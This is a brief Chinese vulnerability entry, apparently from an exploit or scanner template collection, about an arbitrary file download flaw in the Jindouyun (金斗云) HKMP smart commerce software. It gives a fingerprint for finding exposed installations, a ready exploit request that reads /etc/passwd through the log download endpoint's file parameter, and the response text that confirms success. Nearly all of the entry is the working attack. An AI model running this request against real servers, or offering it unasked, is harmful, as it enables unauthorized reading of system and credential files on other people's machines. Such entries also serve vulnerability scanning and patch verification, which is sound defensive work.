# 金斗云HKMP智慧商业软件存在任意文件下载漏洞

金斗云HKMP智慧商业软件 ｜ 其他 ｜ —
- **指纹**：`body="金斗云 HKMP"`
- **请求**：`GET /admin/log/download?file=/etc/passwd HTTP/1.1`
- **响应特征**：200 root: